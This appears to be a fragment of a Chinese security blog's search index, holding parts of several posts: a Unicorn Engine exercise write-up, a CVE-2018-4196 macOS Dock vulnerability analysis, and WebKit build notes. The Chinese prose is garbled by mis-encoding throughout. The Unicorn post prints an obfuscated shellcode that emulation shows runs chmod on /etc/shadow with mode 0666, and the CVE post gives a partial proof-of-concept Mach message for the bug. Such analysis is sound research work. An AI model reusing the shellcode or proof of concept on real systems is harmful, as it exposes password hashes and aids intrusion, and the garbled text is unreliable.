0x257aaff0RtlAllocateHeap(0x950000L , 0x8L , 0xcL) = 0x257bcff0RtlAllocateHeap(0x950000L , 0x8L , 0xcL) = 0x2694aff0RtlAllocateHeap(0x950000L , 0x8L , 0xcL) = 0x255cfff0RtlFreeHeap(0x950000L , 0x0L , 0x255cfff0L) = 0x1RtlFreeHeap(0x950000L , 0x0L , 0x2694aff0L) = 0x1RtlFreeHeap(0x950000L , 0x0L , 0x257bcff0L) = 0x1RtlFreeHeap(0x950000L , 0x0L , 0x257aaff0L) = 0x1RtlFreeHeap(0x950000L , 0x0L , 0x26f1aff0L) = 0x1...","link":"/2018/11/07/UAF-analysis-using-pykd/"},{"title":"Unicorn Engineåˆä½“éªŒ","text":"0x00:å…³äºunicorn engineUnicorn Engineæ˜¯ä¸€ä¸ªæ¨¡æ‹Ÿå™¨(emulator)ï¼Œç®€å•çš„æ¥è¯´å°±æ˜¯å¯ä»¥æ¨¡æ‹Ÿæ‰§è¡Œç¨‹åºorç‰‡æ®µçš„ä»£ç ã€‚å¯¹äºé€†å‘åˆ†ææ¥è¯´å¾ˆæœ‰ç”¨ï¼Œæ¯”å¦‚åˆ†ææŸä¸ªç‰‡æ®µçš„ä»£ç çš„ä½œç”¨ï¼›å¯¹äºæ¼æ´æŒ–æ˜é€‰æ‰‹æ¥è¯´ï¼Œå‰ä¸€æ®µæ—¶é—´çš„unicorn-aflç€å®äº®çœ¼ï¼Œä¸è¿‡æœ‰å¸¦æ›´æ·±å…¥çš„ç ”ç©¶ã€‚ 0x01:å…³äºæœ¬æ–‡å¾ˆå·§ï¼Œä»Šå¤©ç„æ­¦æ¨é€æ¨äº†ä¸€ç¯‡Unicorn Engine tutorialï¼Œæ„Ÿè§‰å†™çš„å¾ˆå¥½ï¼Œä½œè€…ä¹Ÿå¾ˆæœ‰è¶£ï¼Œæ–‡ç« ä¸­è¿˜å¸ƒç½®äº†home workï¼Œå“ˆå“ˆå“ˆï¼Œä¸Šç­çš„æ—¶å€™æ²¡æ—¶é—´åšï¼Œä¸‹ç­å›åˆ°å®¶å°±çœ‹äº†çœ‹ï¼Œæ¨¡ä»¿è€…ç¬¬ä¸€ä¸ªä¾‹å­ï¼Œå’Œä½œè€…ç»™å‡ºçš„hintæŠŠä¸¤ä¸ªhome workåšäº†ä¸‹ã€‚ 0x02: shellcodeåˆ†æä½œè€…åœ¨è¿™é‡Œç»™å‡ºäº†ä¸€æ®µæ··æ·†è¿‡çš„shellcodeï¼Œç›´æ¥åæ±‡ç¼–å™¨æŸ¥çœ‹çš„è¯ï¼Œå¹¶ä¸èƒ½ç›´æ¥åˆ†æå‡ºè¿™æ®µshellcodeçš„ä½œç”¨ã€‚ 1shellcode = &quot;\\xe8\\xff\\xff\\xff\\xff\\xc0\\x5d\\x6a\\x05\\x5b\\x29\\xdd\\x83\\xc5\\x4e\\x89\\xe9\\x6a\\x02\\x03\\x0c\\x24\\x5b\\x31\\xd2\\x66\\xba\\x12\\x00\\x8b\\x39\\xc1\\xe7\\x10\\xc1\\xef\\x10\\x81\\xe9\\xfe\\xff\\xff\\xff\\x8b\\x45\\x00\\xc1\\xe0\\x10\\xc1\\xe8\\x10\\x89\\xc3\\x09\\xfb\\x21\\xf8\\xf7\\xd0\\x21\\xd8\\x66\\x89\\x45\\x00\\x83\\xc5\\x02\\x4a\\x85\\xd2\\x0f\\x85\\xcf\\xff\\xff\\xff\\xec\\x37\\x75\\x5d\\x7a\\x05\\x28\\xed\\x24\\xed\\x24\\xed\\x0b\\x88\\x7f\\xeb\\x50\\x98\\x38\\xf9\\x5c\\x96\\x2b\\x96\\x70\\xfe\\xc6\\xff\\xc6\\xff\\x9f\\x32\\x1f\\x58\\x1e\\x00\\xd3\\x80&quot; 1234567# muhe @ muheMacBookPro in /tmp [22:38:29]$ python -c 'shellcode = &quot;\\xe8\\xff\\xff\\xff\\xff\\xc0\\x5d\\x6a\\x05\\x5b\\x29\\xdd\\x83\\xc5\\x4e\\x89\\xe9\\x6a\\x02\\x03\\x0c\\x24\\x5b\\x31\\xd2\\x66\\xba\\x12\\x00\\x8b\\x39\\xc1\\xe7\\x10\\xc1\\xef\\x10\\x81\\xe9\\xfe\\xff\\xff\\xff\\x8b\\x45\\x00\\xc1\\xe0\\x10\\xc1\\xe8\\x10\\x89\\xc3\\x09\\xfb\\x21\\xf8\\xf7\\xd0\\x21\\xd8\\x66\\x89\\x45\\x00\\x83\\xc5\\x02\\x4a\\x85\\xd2\\x0f\\x85\\xcf\\xff\\xff\\xff\\xec\\x37\\x75\\x5d\\x7a\\x05\\x28\\xed\\x24\\xed\\x24\\xed\\x0b\\x88\\x7f\\xeb\\x50\\x98\\x38\\xf9\\x5c\\x96\\x2b\\x96\\x70\\xfe\\xc6\\xff\\xc6\\xff\\x9f\\x32\\x1f\\x58\\x1e\\x00\\xd3\\x80&quot;;print shellcode' &gt; sc.dump# muhe @ muheMacBookPro in /tmp [22:38:37]$ file sc.dumpsc.dump: data ç”¨r2åˆ†æçš„è¯ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950[0x00000000]&gt; pd 0x00000000 e8ffffffff call 4 0x00000005 c05d6a05 rcr byte [rbp + 0x6a], 5 0x00000009 5b pop rbx 0x0000000a 29dd sub ebp, ebx 0x0000000c 83c54e add ebp, 0x4e ; 'N' 0x0000000f 89e9 mov ecx, ebp 0x00000011 6a02 push 2 ; 2 0x00000013 030c24 add ecx, dword [rsp] 0x00000016 5b pop rbx 0x00000017 31d2 xor edx, edx 0x00000019 66ba1200 mov dx, 0x12 ; 18 â”Œâ”€&gt; 0x0000001d 8b39 mov edi, dword [rcx] â 0x0000001f c1e710 shl edi, 0x10 â 0x00000022 c1ef10 shr edi, 0x10 â 0x00000025 81e9feffffff sub ecx, 0xfffffffe â 0x0000002b 8b4500 mov eax, dword [rbp] â 0x0000002e c1e010 shl eax, 0x10 â 0x00000031 c1e810 shr eax, 0x10 â 0x00000034 89c3 mov ebx, eax â 0x00000036 09fb or ebx, edi â 0x00000038 21f8 and eax, edi â 0x0000003a f7d0 not eax â 0x0000003c 21d8 and eax, ebx â 0x0000003e 66894500 mov word [rbp], ax â 0x00000042 83c502 add ebp, 2 â 0x00000045 4a85d2 test rdx, rdx â””â”€&lt; 0x00000048 0f85cfffffff jne 0x1d 0x0000004e ec in al, dx 0x0000004f 37 invalid â”Œâ”€&lt; 0x00000050 755d jne 0xaf â”Œâ”€â”€&lt; 0x00000052 7a05 jp 0x59 â”‚â”‚ 0x00000054 28ed sub ch, ch â”‚â”‚ 0x00000056 24ed and al, 0xed â”‚â”‚ 0x00000058 24ed and al, 0xed â”‚ 0x0000005a 0b887feb5098 or ecx, dword [rax - 0x67af1481] â”‚ 0x00000060 38f9 cmp cl, bh â”‚ 0x00000062 5c pop rsp â”‚ 0x00000063 96 xchg eax, esi â”‚ 0x00000064 2b9670fec6ff sub edx, dword [rsi - 0x390190] â”‚ 0x0000006a c6 invalid â”‚ 0x0000006b ff9f321f581e lcall [rdi + 0x1e581f32] â”‚ 0x00000071 00d3 add bl, dl â”‚ 0x00000073 800aff or byte [rdx], 0xff â”‚ 0x00000076 ff invalid â”‚ 0x00000077 ff invalid â”‚ 0x00000078 ff invalid â”‚ 0x00000079 ff invalid â”‚ 0x0000007a ff invalid â”‚ 0x0000007b ff invalid äº‹å®æ˜¯å•¥éƒ½çœ‹ä¸å‡ºæ¥ï¼Œä½†æ˜¯ä½œè€…è¯´ï¼š 1Note that the architecture is x86-32 now. List of syscalls numbers can be found here. 32ä½çš„ï¼Œè€Œä¸”æ˜¯è°ƒç”¨äº†ç³»ç»Ÿè°ƒç”¨æäº‹æƒ…çš„ã€‚é‚£å°±å¯ä»¥æ¨¡ä»¿æ–‡ä¸­çš„ä¾‹å­ï¼Œæ¨¡æ‹Ÿæ‰§è¡Œè¿™æ®µä»£ç ï¼Œç„¶åå¯¹ç³»ç»Ÿè°ƒç”¨æ‰“hookï¼ŒæŠŠå‚æ•°printå‡ºæ¥ï¼Œç„¶åå†è·³è¿‡å»ã€‚ æ ¹æ®èµ„æ–™ï¼Œè°ƒç”¨å·æ”¾åœ¨eaxå¯„å­˜å™¨ï¼Œå‚æ•°çš„é¡ºåºæ˜¯ï¼šebx,ecx,edx,esi,ediã€‚ä¸‹é¢å°±æ˜¯hookäº†int 80hæŒ‡ä»¤ï¼Œç„¶åæäº‹æƒ…ã€‚ æˆ‘çš„hookå‡½æ•°ï¼š 1234567891011121314151617181920def hook_code(mu, address, size, user_data): op_code = mu.mem_read(address, size) if op_code == &quot;\\xcd\\x80&quot;: call_number = mu.reg_read(UC_X86_REG_EAX) param1 = mu.reg_read(UC_X86_REG_EBX) param2 = mu.reg_read(UC_X86_REG_ECX) param3 = mu.reg_read(UC_X86_REG_EDX) param4 = mu.reg_read(UC_X86_REG_ESI) param5 = mu.reg_read(UC_X86_REG_EDI) print (&quot;[*]Result as followed:&quot;) print (&quot;\\tCall number: {0}&quot;.format(call_number)) print (&quot;\\tParam1 : {0}&quot;.format(param1)) print (&quot;\\tParam2 : {0}&quot;.format(param2)) print (&quot;\\tParam3 : {0}&quot;.format(param3)) print (&quot;\\tParam4 : {0}&quot;.format(param4)) print (&quot;\\tParam5 : {0}&quot;.format(param5)) mu.reg_write(UC_X86_REG_EIP, address + size) è¿è¡Œç»“æœï¼š 12345678910111213141516 $ python task1.py[*]Result as followed: Call number: 15 Param1 : 4194392 Param2 : 438 Param3 : 0 Param4 : 0 Param5 : 32979[*]Result as followed: Call number: 1 Param1 : 4194392 Param2 : 438 Param3 : 0 Param4 : 0 Param5 : 32979 ç¬¬å››ã€ç¬¬äº”ä¸ªå‚æ•°åº”è¯¥æ²¡ç”¨åˆ°ï¼Œç¬¬ä¸€æ¬¡è°ƒç”¨æ—¶15å·è°ƒç”¨ï¼Œç¬¬äºŒæ¬¡æ˜¯1å·è°ƒç”¨ã€‚æŸ¥äº†ä¸€ä¸‹ï¼Œ15å·æ˜¯chmodï¼Œ1å·æ˜¯exitã€‚chmodçš„å‚æ•°åº”è¯¥æ˜¯æ–‡ä»¶åï¼Œæƒé™ã€‚exitçš„å‚æ•°çš„è¯ï¼Œå°±æ˜¯4194392ã€‚ å°±æ˜¯æƒ³åŠæ³•ç¡®å®šchmodæ“ä½œäº†ä»€ä¹ˆæ–‡ä»¶ï¼Œ4194392åº”è¯¥æ˜¯ä¸€ä¸ªæŒ‡é’ˆã€‚ä¿®æ”¹hookå‡½æ•°ï¼š 12345678print (&quot;\\tCall number: {0}&quot;.format(call_number)) if call_number == 15: file = mu.mem_read(param1, 32).split(&quot;\\x00&quot;)[0] print (&quot;\\t[*]File is {0}&quot;.format(file)) else: print (&quot;\\tParam1 : {0}&quot;.format(param1)) 123456789101112131415[*]Result as followed: Call number: 15 [*]File is /etc/shadow Param2 : 438 Param3 : 0 Param4 : 0 Param5 : 32979[*]Result as followed: Call number: 1 Param1 : 4194392 Param2 : 438 Param3 : 0 Param4 : 0 Param5 : 32979 chmodçš„ç¬¬äºŒä¸ªå‚æ•°å…¶å®å°±æ˜¯0666: 123&gt;&gt;&gt; oct(438)'0666'&gt;&gt;&gt; åˆ°æ­¤ï¼Œåˆ†æå®Œæ¯•ã€‚ 0x03: ä¿®æ”¹å‡½æ•°çš„è¿”å›å€¼ä¿®æ”¹ä¸‹é¢ç¨‹åºçš„é€»è¾‘ï¼Œä½¿å¾—è¿”å›å€¼æ˜¯1ã€‚ 1234567891011121314151617181920212223242526272829303132333435int strcmp(char *a, char *b){ //get length int len = 0; char *ptr = a; while(*ptr) { ptr++; len++; } //comparestrings for(int i=0; i&lt;=len; i++) { if (a[i]!=b[i]) return 1; } return 0;}__attribute__((stdcall))int super_function(int a, char *b){ if (a==5 &amp;&amp; !strcmp(b, &quot;batman&quot;)) { return 1; } return 0;}int main(){ super_function(1, &quot;spiderman&quot;);} è¿™ä¸ªä¹Ÿå¥½åšï¼Œç›´æ¥è°ƒç”¨super_function,ç„¶åæ ¹æ®æ ˆçš„ç»“æ„ï¼Œç›´æ¥æŠŠå‚æ•°æ”¹äº†ï¼Œå› ä¸ºæ˜¯x86ï¼Œcè¯­è¨€çš„è°ƒç”¨çº¦å®šæ˜¯ä»å³åˆ°å·¦ä¾æ¬¡å‹æ ˆï¼Œæ‰€ä»¥å­—ç¬¦ä¸²spidermançš„æŒ‡é’ˆæ˜¯ç¬¬ä¸€ä¸ªå‹æ ˆçš„ã€‚ 123456...saved ebpret addr1ptr ---&gt; &quot;spiderman\\0&quot;... å¤§æ¦‚å°±æ˜¯ä¸Šé¢è¿™æ ·ã€‚ è¿™éƒ¨åˆ†æ¯”è¾ƒå®¹æ˜“ï¼Œè‡ªå·±ç¼–è¯‘ä¸€ä¸ªè¿™ä¸ªç¨‹åºï¼Œç„¶åæ‰¾ä¸€ä¸‹super_functionå‡½æ•°çš„å¼€å¤´å’Œç»“å°¾ã€‚ è¿™ä¸ªbinæ–‡ä»¶åœ¨macä¸Šç¼–è¯‘å‡ºæ¥ï¼Œåœ°å€å•¥çš„ä¸ä¸€æ ·ï¼Œå†™è„šæœ¬çš„æ—¶å€™è¦æ³¨æ„ï¼Œbinæ–‡ä»¶æ˜ å°„åœ°å€æœ€å¥½æ˜¯idaé‡Œåˆ†æçš„æ–‡ä»¶èµ·å§‹åœ°å€ï¼Œè¿™æ ·çš„è¯ï¼Œåé¢è°ƒç”¨super funcçš„æ—¶å€™ï¼Œåœ°å€å•¥çš„å¯ä»¥ç›´æ¥ç”¨ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839from unicorn import *from unicorn.x86_const import *import structdef read(name): with open(name) as f: return f.read()def u32(data): return struct.unpack(&quot;I&quot;, data)[0]def p32(num): return struct.pack(&quot;I&quot;, num)mu = Uc (UC_ARCH_X86, UC_MODE_32)BASE = 0x00000000STACK_ADDR = 0x40000000STACK_SIZE = 1024*1024mu.mem_map(BASE, 1024*1024)mu.mem_map(STACK_ADDR, STACK_SIZE)mu.mem_write(BASE, read(&quot;./function&quot;))r_esp = STACK_ADDR + (STACK_SIZE/2) #ESP points to this address at function callSTRING_ADDR = 0x40000000mu.mem_write(STRING_ADDR, &quot;batman\\x00&quot;) #write &quot;batman&quot; somewhere. We have choosen an address 0x0 which belongs to the stack.mu.reg_write(UC_X86_REG_ESP, r_esp) #set ESPmu.mem_write(r_esp+4, p32(5)) #set the first argument. It is integer 5mu.mem_write(r_esp+8, p32(STRING_ADDR)) #set the second argument. This is a pointer to the string &quot;batman&quot;mu.emu_start(0x0000057B, 0x000005B1) #start emulation from the beginning of super_function, end at RET instructionreturn_value = mu.reg_read(UC_X86_REG_EAX)print &quot;The returned value is: %d&quot; % return_value 1234# muhe @ muheMacBookPro in ~/Downloads [15:19:10]$ python task2.pyThe returned value is: 1 0x04: arm32çš„ä¸€ä¸ªcmç±»ä¼¼äºä½œè€…åŸæ–‡çš„ç¬¬ä¸€ä¸ªdemoï¼Œå°±æ˜¯é‚£ä¸ªctfé¢˜ç›®ï¼Œåªä¸è¿‡è¿™æ¬¡archæ¢æˆäº†arm32ï¼Œæ³¨æ„å¤§å°ç«¯ã€‚ 1234567int __cdecl __noreturn main(int argc, const char **argv, const char **envp){ int v3; // r0 v3 = ccc(0x2710u, (int)argv, (int)envp); printf((const char *)&amp;unk_745A4, v3);} åœ¨æ²¡æœ‰armç¯å¢ƒçš„æƒ…å†µä¸‹ï¼Œä½¿ç”¨unicornæ¥å¾—å‡ºè¿™ä¸ªå‡½æ•°ç»“ç®—ç»“æœ-ã€‚- è™½ç„¶æˆ‘æœ‰armç¯å¢ƒ 2333333 æœäº†ä¸€ä¸‹armä¼ å‚çš„æ–¹å¼ï¼š è¾“å…¥å‚æ•°é€šè¿‡r0-r3ä¼ é€’ï¼Œå¤šä½™çš„æ”¾å…¥å †æ ˆä¸­ï¼›è¿”å›å€¼æ”¾å…¥r0ï¼Œä¸å¤Ÿçš„è¯æ”¾å…¥{r0,r1}æˆ–è€…{r0,r1,r2,r3}ï¼Œæ¯”å¦‚ï¼šint foo(int a, int b, int c, int d), è¾“å…¥ï¼šr0 = a, r1 = b, r2 = c, r3 = dï¼Œè¿”å›ï¼šr0 = ç±»å‹ä¸ºintçš„retvalueint *foo(char a, double b, int c, char d), è¾“å…¥ï¼šr0 = a, r1ç”¨äºå¯¹é½(double è¦æ±‚8å­—èŠ‚å¯¹é½), b = {r2, r3}ï¼Œcæ”¾åœ¨å †æ ˆçš„sp[0]ä½ç½®ï¼Œdæ”¾åœ¨å †æ ˆçš„sp[4]ä½ç½®ï¼Œè¿™é‡Œçš„spæ˜¯æŒ‡è¿›å…¥å‡½æ•°æ—¶çš„spï¼›è¿”å›ï¼šr0 = ç±»å‹ä¸ºint *çš„retvalue æ³¨æ„å¦‚æœè¿”å›å€¼æ˜¯ç»“æ„ä½“ï¼Œæƒ…å†µæœ‰äº›ç‰¹æ®Šï¼šstruct client foo(int a, char b, float c), è¾“å…¥ï¼šr0 = ä¸€ä¸ªstrcut client *å˜é‡ï¼Œç”±è°ƒç”¨è€…ç»™å‡º, r1 = a, r2 = b, r3 = cï¼›è¿”å›ï¼šstrcut client *å˜é‡ï¼Œå’Œè°ƒç”¨è€…ç»™çš„ä¸€æ · 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263from unicorn import *from unicorn.arm_const import *import structdef read(name): with open(name) as f: return f.read() def u32(data): return struct.unpack(&quot;I&quot;, data)[0] def p32(num): return struct.pack(&quot;I&quot;, num)mu = Uc (UC_ARCH_ARM, UC_MODE_LITTLE_ENDIAN)BASE = 0x10000STACK_ADDR = 0x300000STACK_SIZE = 1024*1024mu.mem_map(BASE, 1024*1024)mu.mem_map(STACK_ADDR, STACK_SIZE)mu.mem_write(BASE, read(&quot;./task4_arm&quot;))mu.reg_write(UC_ARM_REG_SP, STACK_ADDR + STACK_SIZE/2)instructions_skip_list = []CCC_START = 0x000104D0CCC_END = 0x00010580stack = [] # Stack for storing the argumentsd = {} # Dictionary that holds return values for given function argumentsdef hook_code(mu, address, size, user_data): if address == CCC_START: # Are we at the beginning of ccc function? arg0 = mu.reg_read(UC_ARM_REG_R0) # Read the first argument. it is passed by R0 if arg0 in d: # Check whether return value for this function is already saved. ret = d[arg0] mu.reg_write(UC_ARM_REG_R0, ret) # Set return value in R0 mu.reg_write(UC_ARM_REG_PC, 0x105BC) # Set PC to point at &quot;BX LR&quot; instruction. We want to return from fibonacci function else: stack.append(arg0) # If return value is not saved for this argument, add it to stack. elif address == CCC_END: arg0 = stack.pop() # We know arguments when exiting the function ret = mu.reg_read(UC_ARM_REG_R0) # Read the return value (R0) d[arg0] = retmu.hook_add(UC_HOOK_CODE, hook_code)mu.emu_start(0x00010584, 0x000105A8)print &quot;ret:{0}&quot;.format(mu.reg_read(UC_ARM_REG_R1)) 123# muhe @ muheMacBookPro in ~/Downloads [15:34:12]$ python task4.pyret:2635833876 0x05: å‚è€ƒUnicorn Engine tutorial armå¹³å°å‡½æ•°ä¼ é€’å‚æ•°ï¼Œåæ±‡ç¼–å®ä¾‹åˆ†æ","link":"/2018/01/15/Unicorn-Engine%E5%88%9D%E4%BD%93%E9%AA%8C/"},{"title":"Uninitialised Objective-C Pointer Vulnerability Analysis (CVE-2018-4196)","text":"infoMWR Labåœ¨pwn2own2018ç”¨æ¥macOSä¸Šä¸€æ•´å¥—åˆ©ç”¨çš„sbxéƒ¨åˆ†æ¼æ´åˆ†æï¼Œè¿™ä¸ªæ¼æ´å‘ç”Ÿåœ¨com.apple.dock.serveræœåŠ¡ï¼Œæ˜¯ä¸€ä¸ªæ ˆæŒ‡é’ˆæœªåˆå§‹åŒ–ã€‚ vuln(10.13â€™s Dock binary)1234567891011121314v107 = a5;v5 = a3;v105 = a2;v111 = 1;v102 = a4;v6 = (const char *)a4;v98 = a4;v7 = UnserializeCFType(a3, a4, &amp;v89);v8 = objc_autorelease(*(_QWORD *)&amp;v89);v9 = (void *)_objc_retain(v8);v10 = v9;if ( v7 ){... v89æœªåˆå§‹åŒ–ï¼Œåˆ°è¿™é‡Œè¿˜é€ æˆä¸äº†ä»€ä¹ˆé—®é¢˜ï¼› ä¸»è¦æ˜¯çœ‹UnserializeCFTypeçš„é€»è¾‘ï¼Œè¿™ä¸ªå‡½æ•°ä¼šcallåˆ°_AXUnserializeCFType 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152__text:000000000000F043__text:000000000000F043 public _AXUnserializeCFType__text:000000000000F043 _AXUnserializeCFType proc near ; CODE XREF: _UnserializeCFType+16â†‘j__text:000000000000F043 ; _AXUnserializeWrapper+15â†“j ...__text:000000000000F043__text:000000000000F043 var_8 = qword ptr -8__text:000000000000F043__text:000000000000F043 push rbp__text:000000000000F044 mov rbp, rsp__text:000000000000F047 sub rsp, 10h__text:000000000000F04B mov [rbp+var_8], rdx__text:000000000000F04F mov eax, 0FFFF9D8Fh__text:000000000000F054 cmp rcx, 8__text:000000000000F058 jb short loc_F0B7__text:000000000000F05A mov qword ptr [r8], 0__text:000000000000F061 mov esi, [rdx]__text:000000000000F063 cmp esi, 6F77656Eh__text:000000000000F069 jz short loc_F073__text:000000000000F06B cmp esi, 61656C61h__text:000000000000F071 jnz short loc_F0B7__text:000000000000F073__text:000000000000F073 loc_F073: ; CODE XREF: _AXUnserializeCFType+26â†‘j__text:000000000000F073 lea rax, [rdx+4]__text:000000000000F077 mov [rbp+var_8], rax__text:000000000000F07B mov eax, [rdx+4]__text:000000000000F07E cmp rax, 0Fh__text:000000000000F082 jbe short loc_F08D__text:000000000000F084 lea r9, _bogusUnserialize__text:000000000000F08B jmp short loc_F098__text:000000000000F08D ; ---------------------------------------------------------------------------__text:000000000000F08D__text:000000000000F08D loc_F08D: ; CODE XREF: _AXUnserializeCFType+3Fâ†‘j__text:000000000000F08D lea rdx, _sUnserializeFunctions__text:000000000000F094 mov r9, [rdx+rax*8]__text:000000000000F098__text:000000000000F098 loc_F098: ; CODE XREF: _AXUnserializeCFType+48â†‘j__text:000000000000F098 add rcx, 0FFFFFFFFFFFFFFFCh__text:000000000000F09C xor eax, eax__text:000000000000F09E cmp esi, 6F77656Eh__text:000000000000F0A4 setz al__text:000000000000F0A7 lea rsi, [rbp+var_8]__text:000000000000F0AB mov rdx, rcx__text:000000000000F0AE mov rcx, r8__text:000000000000F0B1 mov r8d, eax__text:000000000000F0B4 call r9 ; _bogusUnserialize__text:000000000000F0B7__text:000000000000F0B7 loc_F0B7: ; CODE XREF: _AXUnserializeCFType+15â†‘j__text:000000000000F0B7 ; _AXUnserializeCFType+2Eâ†‘j__text:000000000000F0B7 add rsp, 10h__text:000000000000F0BB pop rbp__text:000000000000F0BC retn__text:000000000000F0BC _AXUnserializeCFType endp é—®é¢˜å°±åœ¨äºè¿™ä¸ªå‡½æ•°é‡Œå¯¹è¿™ä¸ªæœªåˆå§‹åŒ–çš„æŒ‡é’ˆçš„å¤„ç†ï¼Œè¿™ä¸ªå‡½æ•°ä¹Ÿæ²¡æœ‰åˆå§‹åŒ–è¿™ä¸ªæŒ‡é’ˆï¼Œè€Œæ˜¯ç›´æ¥åˆ¤æ–­ cmp rcx, 8ï¼Œå†³å®šæ˜¯å¦æ‰§è¡Œååºåˆ—åŒ–çš„æ“ä½œï¼›ç„¶è€Œï¼Œrcxæ˜¯ä¸€ä¸ªå¯æ§å€¼ï¼Œè¿™é‡Œå¯ä»¥æ§åˆ¶rcxå°äº8ï¼Œç„¶åä½¿UnserializeCFTypeæ‰§è¡Œå¤±è´¥ã€‚ è¿™é‡Œå›åˆ°è¿™ä¸ªæœåŠ¡çš„MIG handlerå‡½æ•°: 12v7 = UnserializeCFType(a3, a4, &amp;v89);v8 = objc_autorelease(*(_QWORD *)&amp;v89); å®ƒé»˜è®¤UnserializeCFTypeæ‰§è¡ŒæˆåŠŸï¼Œå¹¶ä¸è€ƒè™‘ä»»ä½•å¤±è´¥çš„æƒ…å†µï¼Œè¿™å°±å¯¼è‡´åé¢ç›´æ¥ä½¿ç”¨è¿™ä¸ªæœªåˆå§‹åŒ–çš„æŒ‡é’ˆä½œä¸ºobjc_autoreleaseçš„å‚æ•°ã€‚ patch 123456789101112131415161718_text:0000000000010ABD__text:0000000000010ABD public _AXUnserializeCFType__text:0000000000010ABD _AXUnserializeCFType proc near ; CODE XREF: _UnserializeCFType+16â†‘j__text:0000000000010ABD ; _AXUnserializeWrapper+1Aâ†“j ...__text:0000000000010ABD__text:0000000000010ABD var_8 = qword ptr -8__text:0000000000010ABD__text:0000000000010ABD push rbp__text:0000000000010ABE mov rbp, rsp__text:0000000000010AC1 sub rsp, 10h__text:0000000000010AC5 mov [rbp+var_8], rdx__text:0000000000010AC9 mov qword ptr [r8], 0__text:0000000000010AD0 mov eax, 0FFFF9D8Fh__text:0000000000010AD5 cmp rcx, 8__text:0000000000010AD9 jb short loc_10B31__text:0000000000010ADB mov esi, [rdx]__text:0000000000010ADD cmp esi, 6F77656Eh__text:0000000000010AE3 jz short loc_10AED åœ¨ _AXUnserializeCFType å¯¹ä¹‹å‰æ²¡åˆå§‹åŒ–çš„æŒ‡é’ˆå…ˆset NULLå¤„ç†ï¼Œç„¶åå†æ‰§è¡Œcmp rcx 8ã€‚ æ‰€ä»¥å³ä½¿ä¹‹å‰è¿˜æ˜¯æœ‰æœªåˆå§‹åŒ–çš„æƒ…å†µï¼Œåœ¨è¿™é‡Œä¹Ÿå½»åº•å µæ­»äº†ã€‚ è‹¹æœçš„è¿™ä¸ªè¡¥æ³•è¿˜æ˜¯æŒºä¼˜é›…çš„ï¼Œä»£ä»·ä¹Ÿæ¯”è¾ƒå°ï¼Œæ¯”ä¸€ä¸ªhandlerä¸€ä¸ªhandlerå¾—å»åšåˆå§‹åŒ–çš„å·¥ä½œè¦æ–¹ä¾¿å¤šäº† :-) refapple-safari-pwn2own-vuln-write-up-2018-10-29 ä¼ªPOCæˆ‘æ²¡çœ‹è¿™ä¸ªæ´æ‰€åœ¨çš„handlerï¼Œè€Œæ˜¯çœ‹åˆ°äº†å¦å¤–çš„ç±»ä¼¼çš„æƒ…å†µï¼Œå·²å¦å¤–ä¸€ä¸ªhandlerä¸ºç›®æ ‡å†™çš„poc : ( æœ‰äº›å­—æ®µçå¡«çš„ï¼Œä¸å½±å“ï¼Œæ‰¾ä¸ªè€ç‰ˆæœ¬ï¼Œæ”¹ä¸€æ”¹å­—æ®µåº”è¯¥okã€‚ 1234567891011121314151617181920212223242526272829303132333435363738struct dock_msg{ mach_msg_header_t hdr; mach_msg_body_t body; mach_msg_ool_descriptor_t ool_desc; uint32_t PAD[2]; uint32_t ool_size;};struct dock_msg m = {0};//header +0m.hdr.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);m.hdr.msgh_bits |= MACH_MSGH_BITS_COMPLEX; // must be complex msgm.hdr.msgh_size = sizeof(struct dock_msg);m.hdr.msgh_remote_port = service_port;m.hdr.msgh_local_port = 0;m.hdr.msgh_voucher_port = 0; //anything you want :-)m.hdr.msgh_id = id;//body must be 1, +0x18m.body.msgh_descriptor_count = 1; int *tmp = malloc(0x1337);//ool desc 12 bytes, +0x1cm.ool_desc.address = tmp;m.ool_desc.deallocate = 0;m.ool_desc.copy = 0;m.ool_desc.pad1 = 0;m.ool_desc.type = 1;m.ool_desc.size = 0x1337; //è¿™ä¸ªå°±æ˜¯ cmp rcx, 8 çš„rcx// padding, +0x28m.PAD[0] = 0x1337;// ool size +0x34m.ool_size = 0x1337;","link":"/2019/09/09/Uninitialised-Objective-C-Pointer-Vulnerability-Analysis-CVE-2018-4196/"},{"title":"Webkitç¼–è¯‘è¸©å‘è®°å½•","text":"0x00 : ç¯å¢ƒåŠå·¥å…·MacOS MoJave 10.14.2 Xcode 10.1 0x01 : ç¼–è¯‘è¿‡ç¨‹ ä¸‹è½½æºç  1https://github.com/WebKit/webkit å®˜ç½‘é‚£ä¸ªå¤ªä¸ç¨³å®šäº†ï¼Œä¸€ç›´æŒ‚ç€ä»£ç†è¿˜å®¹æ˜“æ–­ï¼Œgithubè¿™ä¸ªé•œåƒæ›´ç¨³å®šã€‚ ç¼–è¯‘ ä½¿ç”¨Xcodeæ‰“å¼€é¡¹ç›®ï¼Œä¾æ¬¡æ‰“å¼€ File--&gt;Workspace Settings--&gt;ï¼Œé€‰æ‹©Advancedï¼Œç„¶åé€‰æ‹©Customï¼Œå¹¶ä¸”åœ¨Productså’ŒIntermediatesä¸­å¡«å†™WebkitBuildï¼Œè®¾ç½®å®Œæ¯•ã€‚ å…¶ä»–è®¾ç½®é»˜è®¤å°±å¯ä»¥äº†ï¼Œç„¶åXcodeçš„èœå•æ Procduct--&gt;Buildï¼Œæ…¢æ…¢ç­‰å®ƒç¼–è¯‘å§ï¼Œå¤§æ¦‚ä¸åˆ°10åˆ†é’Ÿçš„æ ·å­å°±å¯ä»¥ç¼–è¯‘å¥½ã€‚ æœ€åå¾—åˆ°: 1234$ lsANGLE.build JavaScriptCore.build PAL.build TestWebKitAPI.build WebInspectorUI.build WebKitTestRunner.build libwebrtc.buildDebug MiniBrowser.build PrecompiledHeaders WTF.build WebKit.build bmalloc.buildDumpRenderTree.build MobileMiniBrowser.build Release WebCore.build WebKitLegacy.build gtest.build 0x02 : è¸©å‘(dyld: Symbol not found)åœ¨è¿è¡Œç¼–è¯‘å®Œçš„binaryçš„æ—¶å€™ï¼Œæˆ‘é‡åˆ°äº†æŠ¥é”™ä¿¡æ¯: 123456$ ./Debug/jscdyld: Symbol not found: __ZN3JSC10DisallowGC19s_scopeReentryCountE Referenced from: /Users/muhe/Code/webkit/WebKitBuild/./Debug/jsc Expected in: 